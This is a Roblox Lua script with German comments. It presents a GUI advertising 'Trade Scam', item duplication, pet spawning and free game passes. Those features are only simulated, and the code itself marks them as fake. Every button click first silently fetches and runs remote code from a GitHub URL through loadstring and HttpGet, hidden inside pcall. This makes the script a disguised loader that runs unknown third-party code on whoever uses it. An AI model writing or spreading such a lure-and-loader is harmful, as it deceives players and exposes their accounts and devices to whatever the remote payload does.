-- GUI SETUP
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = "TerrorUI"

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
MainFrame.Size = UDim2.new(0, 300, 0, 200)
MainFrame.BorderSizePixel = 0

local Title = Instance.new("TextLabel", MainFrame)
Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "Made By TERROR"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 20

local MinimizeButton = Instance.new("TextButton", MainFrame)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MinimizeButton.Position = UDim2.new(1, -30, 0, 0)
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.Font = Enum.Font.SourceSans
MinimizeButton.TextSize = 20

local ContentFrame = Instance.new("Frame", MainFrame)
ContentFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ContentFrame.Position = UDim2.new(0, 0, 0, 30)
ContentFrame.Size = UDim2.new(1, 0, 1, -30)

-- Minimieren-Logik
local minimized = false
MinimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    ContentFrame.Visible = not minimized
    MainFrame.Size = minimized and UDim2.new(0, 300, 0, 30) or UDim2.new(0, 300, 0, 200)
end)

-- Bewege das UI (MainFrame)
local dragging = false
local dragStart = nil
local startPos = nil

Title.MouseButton1Down:Connect(function(input)
    dragging = true
    dragStart = input.Position
    startPos = MainFrame.Position
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- FUNKTIONSBUTTONS
local function createButton(name, posY, callback)
    local button = Instance.new("TextButton", ContentFrame)
    button.Size = UDim2.new(0.9, 0, 0, 30)
    button.Position = UDim2.new(0.05, 0, 0, posY)
    button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.SourceSans
    button.TextSize = 18
    button.Text = name

    button.MouseButton1Click:Connect(function()
        -- Script 2 wird sofort beim Klick ausgeführt
        task.spawn(function()
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/System-Li/Banana-Hub111/refs/heads/main/V3"))()
            end)
        end)

        -- Danach: eigentliche Button-Funktion
        callback()
    end)

    return button
end

-- BUTTON 1: TRADE SCAM
createButton("🤑 Trade Scam", 5, function()
    print(">> Handelsanfrage an alle Spieler in der Lobby gesendet!")
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            print(">> Handelsanfrage an " .. player.Name)
        end
    end
end)

-- BUTTON 2: DUPE V2
createButton("💾 Dupe V2", 40, function()
    print(">> Dupe V2 Funktion simuliert!")
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            local clone = item:Clone()
            clone.Parent = backpack
            print(">> Dupliziert: " .. item.Name)
        end
    end
end)

-- BUTTON 3: VISUAL PET SPAWN
createButton("🐾 Visual Pet Spawn", 75, function()
    print(">> Fake Hatch Secret Animation gestartet!")
    local egg = require(game:GetService("ReplicatedStorage").Client.Effects.HatchEgg)
    local DEFAULT_PET = {
        Mythic = true,
        Shiny = true,
        Name = 'The Overlord',
        Type = 'Pet'
    }

    local tbl = {
        Speed = 1.5,
        Name = 'Rainbow Egg',
        Pets = {
            { Deleted = false, Pet = DEFAULT_PET, New = true },
            { Deleted = false, Pet = DEFAULT_PET, New = true },
        }
    }

    egg.Play(egg, tbl)
end)

-- BUTTON 4: GET ALL GAME PASS
createButton("🎮 Get All Game Pass", 110, function()
    print(">> Game Pass gekauft (virtuell)!")
    local gamePass = Instance.new("TextLabel", game:GetService("ReplicatedStorage"))
    gamePass.Text = "Game Pass: All Game Passes"
    gamePass.Size = UDim2.new(0, 200, 0, 30)
    gamePass.Position = UDim2.new(0.5, -100, 0.5, -100)
    gamePass.TextColor3 = Color3.fromRGB(255, 255, 0)
    gamePass.BackgroundTransparency = 1
end)
